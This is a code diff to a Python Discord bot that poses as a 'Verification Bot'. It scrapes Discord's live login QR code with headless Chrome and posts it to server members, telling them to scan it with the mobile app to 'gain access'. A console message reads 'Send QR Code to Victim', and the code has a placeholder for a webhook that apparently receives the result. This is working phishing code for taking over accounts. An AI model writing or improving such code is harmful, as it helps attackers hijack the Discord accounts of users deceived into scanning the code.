@@ -1,3 +1,4 @@
+from colorama import Fore
 import discord
 from discord.ext import commands, tasks
 from discord.utils import get
@@ -16,18 +17,19 @@ import datetime
 from datetime import date
 from selenium.webdriver.support import expected_conditions
 import threading
-from webdriver_manager.chrome import ChromeDriverManager
-url = webhook
+from webdriver_manager.chrome import ChromeDriverManager#
+import cairosvg
+
+url = "paste your webhook here."
 
 
 def logo_qr(count):
-    im1 = Image.open('temp/qr_code.png', 'r')
+    im1 = Image.open(f'temp/{count}.png', 'r')
     im2 = Image.open('temp/overlay.png', 'r')
     im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55))
+    print(count)
     im1.save(f'temp/{count}.png', quality=95)
-
-
 
 class Buttons(discord.ui.View):
     def __init__(self,client, *, timeout=1):
@@ -42,13 +44,11 @@ class Buttons(discord.ui.View):
 
         if count >= 10:   # How many Threads you want to run // Change if you can handle more.
             return await interaction.followup.send(content="Too many requests try again in 2 Minutes.")
-
-
-
+        
         embed = discord.Embed(title=f"🤖Are you a robot?", description=f"✅ Scan this QR code to gain access to the rest of the server ✅\n\n**Couldnt find?**\n🚫 Try again. It can be buggy...\n\n**Important information**\n🚫 This will NOT work without the Discord mobile application 🚫\n🚫 This code only lasts 2 MINUTES!! 🚫\n\n**Tutorial**\n1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code")
         embed.set_author(name="Verification Bot", icon_url="https://media.discordapp.net/attachments/855286148624941126/987919753534386226/f43bfe6b62b3c38002b3c1cb5100a11a.png")
         options = webdriver.ChromeOptions()
-        options.add_argument("--headless")
+        options.add_argument('--headless')
         options.add_experimental_option('excludeSwitches', ['enable-logging'])
         options.add_experimental_option('detach', True)
         driver = webdriver.Chrome(ChromeDriverManager().install(),options=options)
@@ -63,25 +63,20 @@ class Buttons(discord.ui.View):
             os._exit(1)
         div = div.group(0)
         div = source.find("div", {"class": f"{div}"})
-        qr_code = div.find("img")["src"]
-        source = BeautifulSoup(driver.page_source, features="lxml")
-        div = source.find("div", {"class": "qrCode"})
-        file = os.path.join(os.getcwd(), r"temp/qr_code.png")
-        img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
-
-        with open(file,'wb') as handler:
-            handler.write(img_data)
+        svg = div.find("svg")
+        formatedsvg = '<svg xmlns="http://www.w3.org/2000/svg" height="160" viewBox="0 0 37 37" width="160">' + str(svg)[85:]
 
         discord_login = driver.current_url
         n = random.randint(1,1000)
-        logo_qr(n)
         PATH = f"temp/{n}.png"
-        f = discord.File(f"temp/{n}.png", filename=f"{n}.png")
+        cairosvg.svg2png(bytestring=formatedsvg.encode('utf-8'), write_to=PATH)
+        logo_qr(n)
+        f = discord.File(PATH, filename=f"{n}.png")
         e = discord.Embed()
         embed.set_image(url=f"attachment://{n}.png")
-
         try:
             await interaction.followup.send(file=f,embed=embed)
+            print(f"{Fore.GREEN}Success \.  Send QR Code to Victim.. Waiting for 2 Minutes.")
         except:
             os.remove(f"temp/{n}.png")
             return driver.quit()
